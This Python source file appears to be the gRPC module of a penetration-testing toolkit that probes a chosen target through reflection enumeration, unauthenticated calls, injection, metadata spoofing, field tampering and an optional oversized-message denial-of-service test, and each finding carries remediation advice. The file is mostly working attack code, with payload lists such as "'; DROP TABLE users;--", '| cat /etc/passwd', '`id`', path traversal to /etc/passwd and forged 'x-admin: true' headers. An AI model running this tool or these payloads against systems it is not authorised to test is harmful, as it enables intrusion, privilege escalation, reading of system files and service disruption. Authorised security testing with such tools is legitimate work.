"""
gRPC Fuzzer — modules/inject/grpc_fuzzer.py

Attacks:
  1. Service enumeration    — gRPC reflection API discovery
  2. Method fuzzing         — enumerate all RPC methods per service
  3. Payload injection      — SQLi/SSTI/CMDi via string fields
  4. Auth bypass            — call methods without metadata credentials
  5. Large payload DoS      — oversized messages to exhaust resources
  6. Field tampering        — flip boolean flags, escalate enums
  7. Metadata injection     — inject malicious gRPC headers/metadata
  8. Deadlines bypass       — calls without/extreme deadline values
  9. Error info leakage     — trigger errors, check for stack traces

Requires:
    pip install grpcio grpcio-reflection grpcio-tools

Uses:
    - grpc.Channel for connections
    - grpc_reflection.v1alpha for service discovery
    - Raw protobuf encoding for payload fuzzing

Usage:
    python3 glitchicons.py grpc --target grpc.target.com:443
    python3 glitchicons.py grpc --target grpc.target.com:9090 --insecure
    python3 glitchicons.py grpc --target grpc.target.com:443 --token eyJ...

Author: ardanov96
"""

import json
import time
import struct
from datetime import datetime
from pathlib import Path
from rich.console import Console
from rich.table import Table

console = Console()


# ── Constants ─────────────────────────────────────────────

INJECTION_PAYLOADS = {
    "sqli":  ["' OR '1'='1", "'; DROP TABLE users;--", "1 UNION SELECT version()--"],
    "ssti":  ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
    "cmdi":  ["; ls -la", "| cat /etc/passwd", "`id`"],
    "path":  ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
    "fmt":   ["%s%s%s%s", "%x%x%x%x", "AAAA%08x"],
}

METADATA_INJECTION = [
    ("authorization",    "Bearer ' OR '1'='1"),
    ("x-forwarded-for",  "127.0.0.1' OR '1'='1"),
    ("x-user-id",        "-1"),
    ("x-admin",          "true"),
    ("x-role",           "admin"),
    ("grpc-timeout",     "1S"),
    ("user-agent",       "<script>alert(1)</script>"),
    ("x-request-id",     "../../../../etc/passwd"),
]

BOOLEAN_FLIP_VALUES = [True, False]
ENUM_ESCALATION_VALUES = [0, 1, 2, 999, -1, 2147483647]


# ── Result container ──────────────────────────────────────

class GRPCTestResult:
    """Holds result of a single gRPC attack test."""

    def __init__(self, test_name: str):
        self.test_name = test_name
        self.vulnerable = False
        self.detail = ""
        self.evidence = ""
        self.error = None

    def __repr__(self):
        status = "VULN" if self.vulnerable else "SAFE"
        return f"GRPCTestResult({self.test_name}: {status})"


# ── Protobuf helpers ──────────────────────────────────────

class ProtoEncoder:
    """
    Minimal protobuf encoder for fuzzing — no schema required.
    Encodes fields by wire type only (field 1 = string, field 2 = int, etc.)
    """

    @staticmethod
    def encode_string(field_number: int, value: str) -> bytes:
        """Encode a length-delimited string field."""
        encoded = value.encode("utf-8")
        tag = (field_number << 3) | 2  # wire type 2 = length-delimited
        return ProtoEncoder._varint(tag) + ProtoEncoder._varint(len(encoded)) + encoded

    @staticmethod
    def encode_int(field_number: int, value: int) -> bytes:
        """Encode a varint field."""
        tag = (field_number << 3) | 0  # wire type 0 = varint
        value = value & 0xFFFFFFFFFFFFFFFF  # handle negatives as uint64
        return ProtoEncoder._varint(tag) + ProtoEncoder._varint(value)

    @staticmethod
    def encode_bool(field_number: int, value: bool) -> bytes:
        """Encode a boolean field."""
        return ProtoEncoder.encode_int(field_number, 1 if value else 0)

    @staticmethod
    def _varint(n: int) -> bytes:
        """Encode integer as protobuf varint."""
        result = []
        while n > 0x7F:
            result.append((n & 0x7F) | 0x80)
            n >>= 7
        result.append(n)
        return bytes(result)

    @staticmethod
    def frame_message(proto_bytes: bytes) -> bytes:
        """
        Wrap encoded protobuf in gRPC message frame.
        Frame = [compression_flag(1)] + [message_length(4)] + [message]
        """
        return b"\x00" + struct.pack(">I", len(proto_bytes)) + proto_bytes

    @staticmethod
    def build_injection_message(payload: str, num_fields: int = 3) -> bytes:
        """Build a gRPC message with injection payload in all string fields."""
        proto = b""
        for field_num in range(1, num_fields + 1):
            proto += ProtoEncoder.encode_string(field_num, payload)
        return ProtoEncoder.frame_message(proto)

    @staticmethod
    def build_large_message(size_bytes: int = 65536) -> bytes:
        """Build a gRPC message with oversized payload."""
        payload = "A" * size_bytes
        proto = ProtoEncoder.encode_string(1, payload)
        return ProtoEncoder.frame_message(proto)


# ── gRPC channel wrapper (handles missing grpc gracefully) ──

class GRPCChannel:
    """
    Thin wrapper around grpc.Channel.
    Handles import errors gracefully — tests can run without grpcio.
    """

    def __init__(self, target: str, secure: bool = True, token: str | None = None):
        self.target = target
        self.secure = secure
        self.token = token
        self._channel = None
        self._stub = None

    def connect(self):
        """Establish gRPC channel."""
        import grpc
        if self.secure:
            creds = grpc.ssl_channel_credentials()
            self._channel = grpc.secure_channel(self.target, creds)
        else:
            self._channel = grpc.insecure_channel(self.target)
        return self._channel

    def build_metadata(self, extra: list[tuple] | None = None) -> list[tuple]:
        """Build gRPC call metadata with optional auth."""
        meta = []
        if self.token:
            meta.append(("authorization", f"Bearer {self.token}"))
        if extra:
            meta.extend(extra)
        return meta

    def close(self):
        if self._channel:
            self._channel.close()

    def list_services(self) -> list[str]:
        """Use gRPC reflection to enumerate services."""
        try:
            from grpc_reflection.v1alpha import reflection_pb2, reflection_pb2_grpc
            stub = reflection_pb2_grpc.ServerReflectionStub(self._channel)
            request = reflection_pb2.ServerReflectionRequest(list_services="")
            responses = stub.ServerReflectionInfo(iter([request]))
            services = []
            for resp in responses:
                for svc in resp.list_services_response.service:
                    services.append(svc.name)
            return services
        except Exception as e:
            return []


# ── Main fuzzer ───────────────────────────────────────────

class GRPCFuzzer:
    """
    gRPC security fuzzer.

    Covers:
    - gRPC reflection API abuse (service enumeration)
    - Injection attacks via protobuf string fields
    - Authentication bypass via missing metadata
    - Metadata injection (custom headers)
    - Resource exhaustion (large payloads, no deadline)
    - Error information leakage
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "./findings/grpc",
        token: str | None = None,
        timeout: int = 10,
        delay: float = 0.3,
        insecure: bool = False,
    ):
        self.target = target
        self.output_dir = Path(output_dir)
        self.token = token
        self.timeout = timeout
        self.delay = delay
        self.insecure = insecure
        self.findings: list[dict] = []
        self.services: list[str] = []
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def run(self, dos_test: bool = False) -> list[dict]:
        """Run all gRPC attack modules."""
        console.print(f"\n[bold cyan]  GLITCHICONS gRPC Fuzzer[/bold cyan]")
        console.print(f"  Target   : [yellow]{self.target}[/yellow]")
        console.print(f"  TLS      : {'NO (insecure)' if self.insecure else 'YES'}")
        console.print(f"  Auth     : {'token provided' if self.token else 'none'}\n")

        try:
            import grpc
        except ImportError:
            console.print(
                "[red]  ERROR: grpcio not installed.[/red]\n"
                "  Run: pip install grpcio grpcio-reflection\n"
            )
            return []

        channel = GRPCChannel(self.target, secure=not self.insecure, token=self.token)

        try:
            channel.connect()
        except Exception as e:
            console.print(f"  [red]Connection failed: {e}[/red]")
            return []

        tests = [
            ("Reflection Enumeration",  lambda: self._test_reflection(channel)),
            ("Auth Bypass",             lambda: self._test_auth_bypass(channel)),
            ("Payload Injection",       lambda: self._test_payload_injection(channel)),
            ("Metadata Injection",      lambda: self._test_metadata_injection(channel)),
            ("Field Tampering",         lambda: self._test_field_tampering(channel)),
            ("Deadline Bypass",         lambda: self._test_deadline_bypass(channel)),
            ("Error Info Leakage",      lambda: self._test_error_leakage(channel)),
        ]

        if dos_test:
            tests.append(("Large Payload DoS", lambda: self._test_large_payload(channel)))

        for name, fn in tests:
            console.print(f"  [cyan]>> {name}...[/cyan]", end=" ")
            try:
                result = fn()
                if result and result.vulnerable:
                    console.print(f"[red]FINDING[/red]")
                else:
                    console.print(f"[green]clean[/green]")
            except Exception as e:
                console.print(f"[yellow]error: {e}[/yellow]")
            time.sleep(self.delay)

        channel.close()
        self._print_summary()
        self._save_report()
        return self.findings

    # ── Attack Modules ────────────────────────────────────

    def _test_reflection(self, channel: GRPCChannel) -> GRPCTestResult:
        """Test if gRPC reflection API is enabled (exposes all service methods)."""
        result = GRPCTestResult("reflection")

        services = channel.list_services()
        if services:
            self.services = services
            result.vulnerable = True
            result.evidence = f"Services: {services}"
            self.findings.append(self._make_finding(
                title="gRPC Reflection API Enabled",
                severity="HIGH",
                cvss=7.5,
                cwe="CWE-200",
                description=(
                    f"gRPC Server Reflection is enabled, exposing the full service schema. "
                    f"{len(services)} service(s) discovered: {services[:3]}. "
                    f"Attackers can enumerate all RPC methods, message types, and field names "
                    f"without any source code access."
                ),
                evidence=f"Services found: {services}",
                remediation=(
                    "Disable gRPC reflection in production. "
                    "Only enable in development/staging environments. "
                    "In Go: remove grpc_reflection.Register(). "
                    "In Python: remove reflection.enable_server_reflection()."
                ),
            ))
        return result

    def _test_auth_bypass(self, channel: GRPCChannel) -> GRPCTestResult:
        """Test if methods respond without auth metadata."""
        import grpc

        result = GRPCTestResult("auth_bypass")

        # Try calling a raw RPC with no auth — empty proto message
        empty_msg = ProtoEncoder.frame_message(b"")

        for service in (self.services[:2] or ["helloworld.Greeter"]):
            for method in ["SayHello", "Get", "List", "GetUser", "Ping"]:
                try:
                    rpc_path = f"/{service}/{method}"
                    resp = channel._channel.unary_unary(rpc_path)(
                        empty_msg,
                        metadata=[],  # no auth
                        timeout=self.timeout,
                    )
                    # Got a response without auth = potential bypass
                    result.vulnerable = True
                    result.evidence = f"/{service}/{method} responded without auth"
                    self.findings.append(self._make_finding(
                        title=f"gRPC Method Accessible Without Authentication: {rpc_path}",
                        severity="CRITICAL",
                        cvss=9.1,
                        cwe="CWE-306",
                        description=(
                            f"RPC method {rpc_path} returned a response without any "
                            f"authentication metadata. Sensitive operations may be "
                            f"accessible to unauthenticated callers."
                        ),
                        evidence=result.evidence,
                        remediation=(
                            "Implement server-side interceptors that validate auth metadata "
                            "on every RPC call. Reject calls missing valid credentials with "
                            "UNAUTHENTICATED status code."
                        ),
                    ))
                    return result
                except Exception:
                    continue

        return result

    def _test_payload_injection(self, channel: GRPCChannel) -> GRPCTestResult:
        """Send injection payloads in protobuf string fields."""
        import grpc

        result = GRPCTestResult("payload_injection")
        hits = []

        for category, payloads in INJECTION_PAYLOADS.items():
            for payload in payloads[:2]:  # limit per category
                msg = ProtoEncoder.build_injection_message(payload)

                for service in (self.services[:1] or ["test.Service"]):
                    for method in ["Query", "Search", "Get", "Execute"]:
                        try:
                            rpc_path = f"/{service}/{method}"
                            meta = channel.build_metadata()
                            resp_bytes = channel._channel.unary_unary(rpc_path)(
                                msg,
                                metadata=meta,
                                timeout=self.timeout,
                            )
                            resp_str = str(resp_bytes)

                            # Check for injection confirmation
                            if self._confirm_injection(payload, resp_str, category):
                                hits.append({
                                    "category": category,
                                    "payload":  payload[:50],
                                    "method":   rpc_path,
                                })
                        except Exception:
                            continue

        if hits:
            result.vulnerable = True
            result.evidence = json.dumps(hits[:3], indent=2)
            self.findings.append(self._make_finding(
                title="gRPC Payload Injection Detected",
                severity="HIGH",
                cvss=8.1,
                cwe="CWE-74",
                description=(
                    f"Injection payloads in protobuf string fields triggered anomalous responses. "
                    f"{len(hits)} injection(s) confirmed across: "
                    f"{list(set(h['category'] for h in hits))}."
                ),
                evidence=result.evidence,
                remediation=(
                    "Validate all incoming protobuf field values server-side. "
                    "Never pass raw field values to database queries, templates, or shell. "
                    "Use parameterized queries and input allowlists."
                ),
            ))
        return result

    def _test_metadata_injection(self, channel: GRPCChannel) -> GRPCTestResult:
        """Inject malicious values in gRPC metadata headers."""
        import grpc

        result = GRPCTestResult("metadata_injection")
        accepted = []

        empty_msg = ProtoEncoder.frame_message(b"")

        for meta_key, meta_val in METADATA_INJECTION:
            try:
                malicious_meta = [(meta_key, meta_val)]
                if self.token:
                    malicious_meta.append(("authorization", f"Bearer {self.token}"))

                for service in (self.services[:1] or ["test.Service"]):
                    rpc_path = f"/{service}/Get"
                    resp = channel._channel.unary_unary(rpc_path)(
                        empty_msg,
                        metadata=malicious_meta,
                        timeout=self.timeout,
                    )
                    resp_str = str(resp)

                    # If x-admin:true or x-role:admin changed behavior
                    if meta_key in ("x-admin", "x-role") and "admin" in resp_str.lower():
                        accepted.append({"key": meta_key, "value": meta_val})

            except Exception:
                continue

        if accepted:
            result.vulnerable = True
            result.evidence = json.dumps(accepted, indent=2)
            self.findings.append(self._make_finding(
                title="gRPC Metadata Header Injection — Privilege Escalation",
                severity="CRITICAL",
                cvss=9.3,
                cwe="CWE-290",
                description=(
                    f"Server processes custom metadata headers as trusted privilege indicators. "
                    f"Headers {[a['key'] for a in accepted]} affected server behavior, "
                    f"potentially enabling privilege escalation."
                ),
                evidence=result.evidence,
                remediation=(
                    "Never trust custom metadata headers for authorization decisions. "
                    "Use cryptographically signed tokens (JWT) validated server-side. "
                    "Strip or ignore unexpected metadata headers at the gateway."
                ),
            ))
        return result

    def _test_field_tampering(self, channel: GRPCChannel) -> GRPCTestResult:
        """Test boolean flag flips and enum escalation."""
        import grpc

        result = GRPCTestResult("field_tampering")
        hits = []

        # Test bool field flip (field 1 = True — try to escalate)
        for bool_val in BOOLEAN_FLIP_VALUES:
            proto = ProtoEncoder.encode_bool(1, bool_val)
            msg = ProtoEncoder.frame_message(proto)

            for service in (self.services[:1] or ["test.Service"]):
                for method in ["Create", "Update", "SetAdmin"]:
                    try:
                        rpc_path = f"/{service}/{method}"
                        meta = channel.build_metadata()
                        resp = channel._channel.unary_unary(rpc_path)(
                            msg, metadata=meta, timeout=self.timeout
                        )
                        resp_str = str(resp)
                        if "admin" in resp_str.lower() and bool_val:
                            hits.append({"type": "bool_flip", "field": 1, "value": bool_val})
                    except Exception:
                        continue

        # Test enum escalation
        for enum_val in ENUM_ESCALATION_VALUES:
            if enum_val < 0:
                proto = ProtoEncoder.encode_int(2, enum_val & 0xFFFFFFFF)
            else:
                proto = ProtoEncoder.encode_int(2, enum_val)
            msg = ProtoEncoder.frame_message(proto)

            for service in (self.services[:1] or ["test.Service"]):
                try:
                    rpc_path = f"/{service}/SetRole"
                    meta = channel.build_metadata()
                    resp = channel._channel.unary_unary(rpc_path)(
                        msg, metadata=meta, timeout=self.timeout
                    )
                    resp_str = str(resp)
                    if "admin" in resp_str.lower() or "super" in resp_str.lower():
                        hits.append({"type": "enum_escalation", "field": 2, "value": enum_val})
                except Exception:
                    continue

        if hits:
            result.vulnerable = True
            result.evidence = json.dumps(hits[:3], indent=2)
            self.findings.append(self._make_finding(
                title="gRPC Field Tampering — Boolean/Enum Escalation",
                severity="HIGH",
                cvss=8.0,
                cwe="CWE-285",
                description=(
                    f"Manipulating boolean flags or enum values in protobuf messages "
                    f"affected server authorization logic. "
                    f"{len(hits)} tampering(s) produced elevated access."
                ),
                evidence=result.evidence,
                remediation=(
                    "Validate all protobuf enum values against allowlists server-side. "
                    "Never use client-supplied boolean flags for privilege decisions. "
                    "Enforce role checks server-side from authenticated session, "
                    "not from message content."
                ),
            ))
        return result

    def _test_deadline_bypass(self, channel: GRPCChannel) -> GRPCTestResult:
        """Test gRPC calls without deadline / with extreme deadline."""
        import grpc

        result = GRPCTestResult("deadline_bypass")
        no_deadline_ok = False

        empty_msg = ProtoEncoder.frame_message(ProtoEncoder.encode_string(1, "test"))

        for service in (self.services[:1] or ["test.Service"]):
            for method in ["LongRunning", "Export", "Generate", "Process"]:
                try:
                    rpc_path = f"/{service}/{method}"
                    meta = channel.build_metadata()
                    # Call with no timeout at all
                    resp = channel._channel.unary_unary(rpc_path)(
                        empty_msg, metadata=meta, timeout=None
                    )
                    no_deadline_ok = True
                except Exception:
                    continue

        if no_deadline_ok:
            result.vulnerable = True
            result.evidence = "RPC call with no deadline accepted and processed"
            self.findings.append(self._make_finding(
                title="gRPC No Deadline Enforcement",
                severity="MEDIUM",
                cvss=5.3,
                cwe="CWE-400",
                description=(
                    "gRPC server processes calls with no deadline set. "
                    "Without enforced server-side deadlines, long-running operations "
                    "can hold server resources indefinitely, enabling resource exhaustion."
                ),
                evidence=result.evidence,
                remediation=(
                    "Enforce server-side maximum deadline on all RPC methods. "
                    "Use interceptors to set a maximum timeout regardless of client deadline. "
                    "Reject calls exceeding a reasonable maximum (e.g., 30s)."
                ),
            ))
        return result

    def _test_error_leakage(self, channel: GRPCChannel) -> GRPCTestResult:
        """Send malformed data and check for stack traces in error responses."""
        import grpc

        result = GRPCTestResult("error_leakage")

        # Send completely random bytes to trigger internal errors
        random_bytes = b"\xff\xfe\xfd\xfc" * 100
        framed = ProtoEncoder.frame_message(random_bytes)

        for service in (self.services[:1] or ["test.Service"]):
            for method in ["Get", "Process", "Execute"]:
                try:
                    rpc_path = f"/{service}/{method}"
                    resp = channel._channel.unary_unary(rpc_path)(
                        framed,
                        metadata=channel.build_metadata(),
                        timeout=self.timeout,
                    )
                except Exception as e:
                    err_str = str(e).lower()
                    stack_indicators = [
                        "traceback", "exception", "stack trace", "at line",
                        "nullpointerexception", "segmentation fault", "panic:",
                        "goroutine", "at java.", "in /home/", "in /usr/",
                    ]
                    if any(ind in err_str for ind in stack_indicators):
                        result.vulnerable = True
                        result.evidence = f"Error from {rpc_path}: {str(e)[:200]}"
                        self.findings.append(self._make_finding(
                            title="gRPC Error Response Leaks Internal Details",
                            severity="MEDIUM",
                            cvss=5.3,
                            cwe="CWE-209",
                            description=(
                                f"gRPC error responses contain internal implementation details "
                                f"including stack traces, file paths, or exception class names. "
                                f"Triggered by sending malformed protobuf to {rpc_path}."
                            ),
                            evidence=result.evidence,
                            remediation=(
                                "Use a server-side interceptor to catch all unhandled errors "
                                "and return sanitized error messages. "
                                "Never include internal paths, class names, or stack traces "
                                "in gRPC status details."
                            ),
                        ))
                        return result

        return result

    def _test_large_payload(self, channel: GRPCChannel) -> GRPCTestResult:
        """Send 1MB+ protobuf message to test resource exhaustion (opt-in)."""
        import grpc

        result = GRPCTestResult("large_payload")

        for service in (self.services[:1] or ["test.Service"]):
            for method in ["Process", "Import", "Upload"]:
                try:
                    large_msg = ProtoEncoder.build_large_message(1_048_576)
                    rpc_path = f"/{service}/{method}"
                    start = time.time()
                    channel._channel.unary_unary(rpc_path)(
                        large_msg,
                        metadata=channel.build_metadata(),
                        timeout=self.timeout * 3,
                    )
                    elapsed = time.time() - start

                    if elapsed > 5.0:
                        result.vulnerable = True
                        result.evidence = f"1MB payload took {elapsed:.2f}s"
                        self.findings.append(self._make_finding(
                            title="gRPC No Message Size Limit — DoS Risk",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-400",
                            description=(
                                f"gRPC server accepted a 1MB+ message and took {elapsed:.2f}s. "
                                f"Without message size limits, attackers can exhaust server memory."
                            ),
                            evidence=result.evidence,
                            remediation=(
                                "Set MaxRecvMsgSize on the gRPC server (default 4MB is too high). "
                                "Recommended: 1MB or less for most APIs. "
                                "Add server-side message size interceptors."
                            ),
                        ))
                        return result
                except Exception:
                    continue

        return result

    # ── Helpers ───────────────────────────────────────────

    def _confirm_injection(self, payload: str, response: str, category: str) -> bool:
        """Check if injection payload produced anomalous response."""
        r = response.lower()
        if category == "sqli":
            return any(err in r for err in ["syntax error", "mysql", "ora-", "sqlite", "pg_"])
        if category == "ssti":
            return "49" in response and "{{7*7}}" in payload
        if category == "cmdi":
            return any(ind in r for ind in ["uid=", "root:", "/bin/", "total "])
        return False

    def _make_finding(
        self,
        title: str,
        severity: str,
        cvss: float,
        cwe: str,
        description: str,
        evidence: str,
        remediation: str,
    ) -> dict:
        return {
            "id":          f"GRPC-{len(self.findings) + 1:03d}",
            "title":       title,
            "severity":    severity,
            "cvss":        cvss,
            "cwe":         cwe,
            "target":      self.target,
            "description": description,
            "evidence":    evidence,
            "remediation": remediation,
            "timestamp":   datetime.now().isoformat(),
        }

    def _print_summary(self):
        console.print(f"\n[bold cyan]  gRPC Results — {self.target}[/bold cyan]")
        if not self.findings:
            console.print("  [green]No findings[/green]\n")
            return

        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID",       style="cyan", width=10)
        table.add_column("Severity", width=10)
        table.add_column("CVSS",     width=6)
        table.add_column("Title")

        colors = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}
        for f in sorted(self.findings, key=lambda x: x["cvss"], reverse=True):
            c = colors.get(f["severity"], "white")
            table.add_row(
                f["id"],
                f"[{c}]{f['severity']}[/{c}]",
                str(f["cvss"]),
                f["title"],
            )
        console.print(table)

    def _save_report(self) -> Path:
        report = {
            "tool":           "glitchicons",
            "module":         "grpc_fuzzer",
            "version":        "0.8.0",
            "target":         self.target,
            "services_found": self.services,
            "timestamp":      datetime.now().isoformat(),
            "total_findings": len(self.findings),
            "findings":       sorted(self.findings, key=lambda x: x.get("cvss", 0), reverse=True),
        }
        out = self.output_dir / f"grpc_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps(report, indent=2, default=str), encoding="utf-8")
        console.print(f"  Report: [cyan]{out}[/cyan]")
        return out
